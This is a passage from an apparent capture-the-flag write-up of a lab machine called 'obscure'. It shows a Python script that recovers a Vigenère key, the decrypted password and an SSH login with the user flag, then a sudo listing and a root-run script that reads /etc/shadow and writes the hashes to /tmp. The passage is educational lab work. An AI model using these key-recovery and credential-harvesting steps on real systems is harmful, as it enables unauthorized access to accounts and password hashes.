&lt;span class="code-line"&gt;&lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Opening file &lt;/span&gt;&lt;span class="si"&gt;{0}&lt;/span&gt;&lt;span class="s2"&gt;...&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;with&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;r&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;encoding&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;UTF-8&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;read&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Decrypting...&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;decrypted&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;decrypt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Writing to &lt;/span&gt;&lt;span class="si"&gt;{0}&lt;/span&gt;&lt;span class="s2"&gt;...&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;o&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;with&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;o&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;w&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;encoding&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;UTF-8&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;decrypted&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Opening file &lt;/span&gt;&lt;span class="si"&gt;{0}&lt;/span&gt;&lt;span class="s2"&gt;...&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;with&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;r&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;encoding&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;UTF-8&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;read&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Encrypting...&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;encrypted&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;encrypt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Writing to &lt;/span&gt;&lt;span class="si"&gt;{0}&lt;/span&gt;&lt;span class="s2"&gt;...&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;o&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;with&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;o&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;w&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;encoding&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;UTF-8&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;encrypted&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We also get the out.txt, passwordreminder.txt and check.txt files. As the first
two contains non printable characters we encode them in base64.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;www-data@obscure:/$ base64 /home/robert/out.txt&lt;/span&gt;
&lt;span class="code-line"&gt;base64 /home/robert/out.txt&lt;/span&gt;
&lt;span class="code-line"&gt;wqbDmsOIw6rDmsOew5jDm8Odw53CicOXw5DDisOfwoXDnsOKw5rDicKSw6bDn8Odw4vCiMOaw5vD&lt;/span&gt;
&lt;span class="code-line"&gt;msOqwoHDmcOJw6vCj8Opw5HDksOdw43DkMKFw6rDhsOhw5nDnsOjwpbDksORwojDkMOhw5nCpsOV&lt;/span&gt;
&lt;span class="code-line"&gt;w6bDmMKewo/Do8OKw47DjcKBw5/DmsOqw4bCjsOdw6HDpMOowonDjsONw5rCjMOOw6vCgcORw5PD&lt;/span&gt;
&lt;span class="code-line"&gt;pMOhw5vDjMOXwonCgXY=&lt;/span&gt;
&lt;span class="code-line"&gt;www-data@obscure:/$ base64 /home/robert/passwordreminder.txt&lt;/span&gt;
&lt;span class="code-line"&gt;base64 /home/robert/passwordreminder.txt&lt;/span&gt;
&lt;span class="code-line"&gt;wrTDkcOIw4zDicOgw5nDgcORw6nCr8K3wr9r&lt;/span&gt;
&lt;span class="code-line"&gt;www-data@obscure:/$ cat /home/robert/check.txt&lt;/span&gt;
&lt;span class="code-line"&gt;Encrypting this file with your key should result in out.txt, make sure your key is correct!&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The script is a simple implementation of the
&lt;a href="https://en.wikipedia.org/wiki/Vigen%C3%A8re_cipher"&gt;Vigenère cipher&lt;/a&gt;. As we got
a clear text (&lt;code&gt;check.txt&lt;/code&gt;) and a cipher text (&lt;code&gt;out.txt&lt;/code&gt;) we can easily get the
key by using a simple python3 script.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;clair&lt;/span&gt;   &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;./check.txt&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;r&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;read&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;chiffre&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;./out.txt&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;r&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;read&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;clair&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="o"&gt;+=&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;chr&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="nb"&gt;ord&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;chiffre&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="nb"&gt;ord&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;clair&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;]))&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;255&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;+=&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Using this script we get the key using to cipher them: &lt;code&gt;alexandrovich&lt;/code&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;python3 decrypt.py&lt;/span&gt;
&lt;span class="code-line"&gt;alexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichal&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;Note: Do not do you own crypto!&lt;/strong&gt; Also, if we didn't had the &lt;code&gt;check.txt&lt;/code&gt; and
&lt;code&gt;out.txt&lt;/code&gt; files the cracking will have been harder. As this was a Vigenère
cipher we could have brute force the key or tried so &lt;a href="https://pages.mtu.edu/~shene/NSF-4/Tutorial/VIG/Vig-Frequency-Analysis.html"&gt;frequency
analysis&lt;/a&gt;
but the &lt;code&gt;passwordreminder.txt&lt;/code&gt; file is a bit short for this kind of attack.&lt;/p&gt;
&lt;p&gt;Then we use the &lt;code&gt;SuperSecureCrypt.py&lt;/code&gt; script to decode the password file with
the key and get the password &lt;code&gt;SecThruObsFTW&lt;/code&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;python3 SuperSecureCrypt.py -i passwordreminder.txt -k alexandrovich -d -o pass &amp;amp;&amp;amp; cat pass&lt;/span&gt;
&lt;span class="code-line"&gt;################################&lt;/span&gt;
&lt;span class="code-line"&gt;#           BEGINNING          #&lt;/span&gt;
&lt;span class="code-line"&gt;#    SUPER SECURE ENCRYPTOR    #&lt;/span&gt;
&lt;span class="code-line"&gt;################################&lt;/span&gt;
&lt;span class="code-line"&gt;  ############################&lt;/span&gt;
&lt;span class="code-line"&gt;  #        FILE MODE         #&lt;/span&gt;
&lt;span class="code-line"&gt;  ############################&lt;/span&gt;
&lt;span class="code-line"&gt;Opening file pas...&lt;/span&gt;
&lt;span class="code-line"&gt;Decrypting...&lt;/span&gt;
&lt;span class="code-line"&gt;Writing to pass...&lt;/span&gt;
&lt;span class="code-line"&gt;SecThruObsFTW&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We can then connect using SSH as robert and get the user flag.
    :::text
    ssh robert@10.10.10.168
    robert@10.10.10.168's password:
    robert@obscure:~$ cat user.txt
    e4493782066b55fe2755708736ada2d7&lt;/p&gt;
&lt;h1 id="getting-root"&gt;Getting root&lt;/h1&gt;
&lt;p&gt;As robert with our SSH shell we start enumerating the box. We have some
interesting &lt;code&gt;sudo&lt;/code&gt; permissions.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;robert@obscure:~$ sudo -l&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;User robert may run the following commands on obscure:&lt;/span&gt;
&lt;span class="code-line"&gt;    (ALL) NOPASSWD: /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We get the betterSSH.py file.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;sys&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;random&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nn"&gt;string&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;os&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;time&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;crypt&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;traceback&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;subprocess&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;path&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;random&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;choices&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;string&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ascii_letters&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;string&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;digits&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;session&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;user&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;authenticated&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;try&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;session&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;user&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;input&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Enter username: &amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;passW&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;input&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Enter password: &amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="k"&gt;with&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/etc/shadow&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;r&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;readlines&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[(&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;split&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;:&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;$&amp;quot;&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;p&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="kc"&gt;None&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;p&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;passwords&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[]&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="ow"&gt;not&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="kc"&gt;None&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;passwords&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;append&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;passwordFile&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;p&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;passwords&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="k"&gt;with&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/tmp/SSH/&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;w&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;passwordFile&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;time&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sleep&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mf"&gt;.1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
